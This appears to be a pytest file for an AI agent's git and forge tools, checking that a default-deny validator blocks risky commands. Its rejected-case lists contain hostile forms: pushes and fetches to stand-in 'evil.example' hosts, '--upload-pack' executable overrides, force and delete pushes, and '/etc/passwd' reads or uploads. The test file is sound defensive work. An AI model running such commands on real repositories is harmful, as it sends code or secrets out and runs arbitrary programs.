"""Tests for the git/forge agent tools (src/agent_tools/git_tools.py).

Focus is the security boundary: the strict default-deny allowlist for
network-mutating git operations (push/fetch/pull), plus registration, admin
gating, and plan-mode exclusion. Includes regression coverage for the exact
dangerous push/fetch forms raised in review.
"""
import asyncio
import shlex

import pytest

from src.agent_tools import TOOL_HANDLERS
from src.agent_tools.git_tools import validate_git_argv, GitTool, ForgeTool
from src.tool_security import NON_ADMIN_BLOCKED_TOOLS, PLAN_MODE_READONLY_TOOLS


def _v(cmd: str):
    return validate_git_argv(shlex.split(cmd))


def test_registered():
    assert "git" in TOOL_HANDLERS
    assert "forge" in TOOL_HANDLERS


def test_admin_gated_and_plan_excluded():
    for t in ("git", "forge"):
        assert t in NON_ADMIN_BLOCKED_TOOLS, f"{t} should be admin-gated"
        assert t not in PLAN_MODE_READONLY_TOOLS, f"{t} mutates -> must be blocked in plan mode"


@pytest.mark.parametrize("cmd", [
    "status", "diff HEAD", "log --oneline", "show", "branch", "blame README",
    "add -A", 'commit -m "msg"', "checkout -b feature", "switch main",
    "restore .", "reset --soft HEAD~1", "stash", "merge feature", "rebase main",
    # narrow, validated network forms
    "push origin HEAD", "push -u origin HEAD", "push --set-upstream origin HEAD",
    "push origin feature/x",
    "fetch", "fetch origin", "fetch --prune origin", "pull", "pull origin main",
    # read-only remote
    "remote -v", "remote show", "remote get-url origin",
])
def test_allowed_forms(cmd):
    assert _v(cmd) is None, f"should be allowed: {cmd}"


@pytest.mark.parametrize("cmd", [
    # blocked subcommands
    "config user.name x", "clone https://example.com/r.git", "daemon", "gc",
    "submodule update", "credential fill",
    # path-redirect / workspace escape
    "status -C /etc", "log --git-dir=/etc/x", "init /some/path",
    # remote mutation
    "remote add origin https://x", "remote set-url origin https://x",
    # remote mutation smuggled past a leading read-only flag (rest[0] bypass)
    "remote -v set-url origin https://evil", "remote --verbose add origin https://evil",
    "remote -v remove origin", "remote -v rename origin upstream",
    # path-escape options on otherwise-allowed subcommands
    "init --separate-git-dir=/tmp/outside",
    "diff --output=/tmp/outside", "diff --output /tmp/outside",
    "diff --no-index /etc/hosts /etc/passwd", "show --output=/tmp/x HEAD",
    # fetch/pull breadth + refspecs (narrow = plain origin only)
    "fetch --all", "pull --all", "fetch origin main:main",
    "pull origin +HEAD:main", "fetch origin refs/heads/x:refs/heads/y",
    # dangerous push forms (review regressions)
    "push --force origin HEAD", "push -f origin HEAD",
    "push --force-with-lease origin HEAD", "push --mirror origin",
    "push --delete origin main", "push origin +HEAD:main",
    "push origin HEAD:main", "push https://evil.example/owner/repo.git HEAD",
    "push -u evil HEAD", "push origin HEAD extra",
    # dangerous fetch/pull overrides
    "fetch --upload-pack=/tmp/evil origin", "fetch --upload-pack /tmp/evil origin",
    "pull --upload-pack=/tmp/evil origin", "fetch --receive-pack=/x origin",
    "fetch https://evil.example/r.git", "fetch --exec=/x origin",
])
def test_rejected_forms(cmd):
    assert _v(cmd) is not None, f"should be rejected: {cmd}"


def test_no_workspace_guard():
    # With no active workspace, both tools fail closed (ctx has no workspace;
    # get_active_workspace() defaults to None in a bare context).
    res = asyncio.run(GitTool().execute("status", {}))
    assert res.get("exit_code") == 1 and "workspace" in res.get("error", "")
    res = asyncio.run(ForgeTool().execute("pr list", {}))
    assert res.get("exit_code") == 1 and "workspace" in res.get("error", "")


# ── forge is read-only: mutating subverbs are rejected before the CLI runs ────

@pytest.fixture
def _forge_env(monkeypatch, tmp_path):
    """Make a forge CLI 'available' and record whether the CLI is ever reached.
    _run_capped is the single execution chokepoint; stub it so no real gh/glab
    runs and we can assert whether a command passed the policy gate."""
    import src.agent_tools.git_tools as gt
    monkeypatch.setattr(gt.shutil, "which", lambda b: "/fake/gh" if b in ("gh", "git") else None)
    calls = []

    async def _fake_run_capped(cmd, **kw):
        calls.append(cmd)
        return {"output": "ran", "exit_code": 0}

    monkeypatch.setattr(gt, "_run_capped", _fake_run_capped)
    return {"calls": calls, "ws": str(tmp_path)}


@pytest.mark.parametrize("cmd", ["pr list", "pr view 12", "issue list", "issue view 5",
                                 "repo view", "pr checks", "pr diff 3", "pr status"])
def test_forge_readonly_allowed(_forge_env, cmd):
    from src.agent_tools.git_tools import run_forge
    res = asyncio.run(run_forge(cmd, _forge_env["ws"]))
    assert res.get("exit_code") == 0, res
    assert _forge_env["calls"], f"read-only form should reach the CLI: {cmd}"


@pytest.mark.parametrize("cmd", ["pr create --fill", "pr create --body-file /etc/passwd",
                                 "pr merge 1 --squash", "pr close 1", "pr edit 1 --title x",
                                 "pr review 1 --approve", "issue create -t x -b y",
                                 "pr comment 1 -b hi", "repo delete owner/r --yes",
                                 "release delete v1 --yes", "issue delete 1 --yes"])
def test_forge_mutations_rejected_before_cli(_forge_env, cmd):
    from src.agent_tools.git_tools import run_forge
    res = asyncio.run(run_forge(cmd, _forge_env["ws"]))
    assert res.get("exit_code") == 1 and "read-only" in res.get("error", "")
    assert not _forge_env["calls"], f"mutating form must NOT reach the CLI: {cmd}"
